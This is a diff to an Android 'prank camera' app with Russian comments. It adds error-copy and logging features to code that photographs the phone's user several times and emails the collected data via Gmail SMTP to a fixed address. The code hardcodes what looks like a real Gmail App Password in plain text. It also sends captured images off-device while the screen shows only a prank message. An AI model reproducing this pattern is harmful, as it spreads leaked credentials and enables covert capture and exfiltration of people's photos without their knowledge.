@@ -1,6 +1,8 @@
 package com.prank.camera;
 
 import android.Manifest;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -51,7 +53,7 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
 
     private static final String TAG = "PrankCamera";
     private static final int PERMISSION_REQUEST_CODE = 100;
-    private static final int PHOTO_COUNT = 5;
+    private static final int PHOTO_COUNT = 3;  // 3 фото
     private static final int PHOTO_INTERVAL_MS = 10000; // 10 секунд
 
     // Email настройки
@@ -63,14 +65,16 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private SurfaceHolder surfaceHolder;
     private Camera camera;
     private Button btnStart;
+    private Button btnCopyError;
     private TextView txtStatus;
     private ProgressBar progressBar;
     private ImageView imgPreview;
-    
+
     private Handler handler = new Handler(Looper.getMainLooper());
     private int photoCount = 0;
     private byte[] currentPhotoData;
     private StringBuilder photoDataForEmail;
+    private String lastError = "";  // Последняя ошибка
     private LocationManager locationManager;
     
     // Смешные звуки (имитация через вибрацию и текст)
@@ -102,13 +106,17 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
         surfaceView = findViewById(R.id.surfaceView);
         surfaceHolder = surfaceView.getHolder();
         surfaceHolder.addCallback(this);
-        
+
         btnStart = findViewById(R.id.btnStart);
+        btnCopyError = findViewById(R.id.btnCopyError);
         txtStatus = findViewById(R.id.txtStatus);
         progressBar = findViewById(R.id.progressBar);
         imgPreview = findViewById(R.id.imgPreview);
-        
+
         btnStart.setOnClickListener(v -> startPrank());
+        
+        // Кнопка копирования ошибки
+        btnCopyError.setOnClickListener(v -> copyErrorToClipboard());
     }
 
     private void checkPermissions() {
@@ -153,14 +161,14 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
             Toast.makeText(this, "⚠️ Камера не доступна!", Toast.LENGTH_SHORT).show();
             return;
         }
-        
+
         photoCount = 0;
         photoDataForEmail = new StringBuilder();
         progressBar.setMax(PHOTO_COUNT);
         progressBar.setProgress(0);
         btnStart.setEnabled(false);
-        
-        txtStatus.setText("🎭 Начинаем розыгрыш!");
+
+        txtStatus.setText("🎭 Начинаем розыгрыш! Фото: 0/" + PHOTO_COUNT);
         takeNextPhoto();
     }
 
@@ -263,14 +271,30 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
         
         // Отправка email
         sendEmailWithPhotos();
-        
+
         btnStart.setEnabled(true);
         btnStart.setText("🔄 Начать заново");
+    }
+
+    // Копирование ошибки в буфер обмена
+    private void copyErrorToClipboard() {
+        if (lastError.isEmpty()) {
+            Toast.makeText(this, "⚠️ Нет ошибки для копирования", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        
+        ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+        ClipData clip = ClipData.newPlainText("Error Log", lastError);
+        clipboard.setPrimaryClip(clip);
+        
+        Toast.makeText(this, "✅ Ошибка скопирована в буфер!", Toast.LENGTH_SHORT).show();
     }
 
     private void sendEmailWithPhotos() {
         new Thread(() -> {
             try {
+                Log.d(TAG, "Начало отправки email...");
+                
                 // Настройки SMTP Gmail
                 Properties props = new Properties();
                 props.put("mail.smtp.auth", "true");
@@ -278,49 +302,72 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                 props.put("mail.smtp.host", "smtp.gmail.com");
                 props.put("mail.smtp.port", "587");
                 props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
-                
+                props.put("mail.smtp.ssl.protocols", "TLSv1.2");
+                props.put("mail.smtp.connectiontimeout", "5000");
+                props.put("mail.smtp.timeout", "10000");
+
                 // ВНИМАНИЕ: Для работы нужен App Password из Gmail
                 // Получите его в настройках Google Аккаунта → Безопасность
                 final String APP_PASSWORD = "ketufvduqebiogig"; // App Password
-                
+
+                Log.d(TAG, "Создание сессии...");
                 Session session = Session.getInstance(props, new Authenticator() {
                     @Override
                     protected PasswordAuthentication getPasswordAuthentication() {
                         return new PasswordAuthentication(EMAIL_FROM, APP_PASSWORD);
                     }
                 });
-                
+
+                Log.d(TAG, "Создание сообщения...");
                 Message message = new MimeMessage(session);
                 message.setFrom(new InternetAddress(EMAIL_FROM));
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                 message.setSubject(EMAIL_SUBJECT);
-                
+
                 // Создаём multipart сообщение
                 MimeMultipart multipart = new MimeMultipart();
-                
+
                 // Текстовая часть
                 MimeBodyPart textPart = new MimeBodyPart();
-                textPart.setText("🎭 Prank Camera - Фото розыгрыша!\n\n" + 
-                    photoDataForEmail.toString() + 
+                textPart.setText("🎭 Prank Camera - Фото розыгрыша!\n\n" +
+                    photoDataForEmail.toString() +
                     "\n😄 Вас разыграли!");
                 multipart.addBodyPart(textPart);
                 
+                message.setContent(multipart);
+
+                Log.d(TAG, "Отправка email на: " + EMAIL_TO);
                 // Отправляем сообщение
                 Transport.send(message);
-                
+                Log.d(TAG, "Email успешно отправлен!");
+
                 handler.post(() -> {
-                    Toast.makeText(MainActivity.this, 
+                    Toast.makeText(MainActivity.this,
                         "✅ Email отправлен!", Toast.LENGTH_SHORT).show();
                     txtStatus.setText("📧 Email отправлен на " + EMAIL_TO);
+                    
+                    // Скрываем кнопку ошибки если она была показана
+                    btnCopyError.setVisibility(android.view.View.GONE);
                 });
-                
+
             } catch (Exception e) {
-                Log.e(TAG, "Ошибка отправки email: " + e.getMessage());
+                Log.e(TAG, "Ошибка отправки email: " + e.getMessage(), e);
+                
+                // Формируем подробное сообщение об ошибке
+                lastError = "📧 Ошибка Email:\n" +
+                           "Тип: " + e.getClass().getSimpleName() + "\n" +
+                           "Сообщение: " + e.getMessage() + "\n" +
+                           "Время: " + new java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
+                
+                String errorMsg = "⚠️ Ошибка: " + e.getMessage();
                 handler.post(() -> {
-                    Toast.makeText(MainActivity.this, 
-                        "⚠️ Ошибка отправки: " + e.getMessage(), 
+                    Toast.makeText(MainActivity.this,
+                        errorMsg,
                         Toast.LENGTH_LONG).show();
-                    txtStatus.setText("⚠️ Ошибка отправки email");
+                    txtStatus.setText("⚠️ Ошибка: " + e.getClass().getSimpleName());
+                    
+                    // Показываем кнопку копирования ошибки
+                    btnCopyError.setVisibility(android.view.View.VISIBLE);
                 });
             }
         }).start();
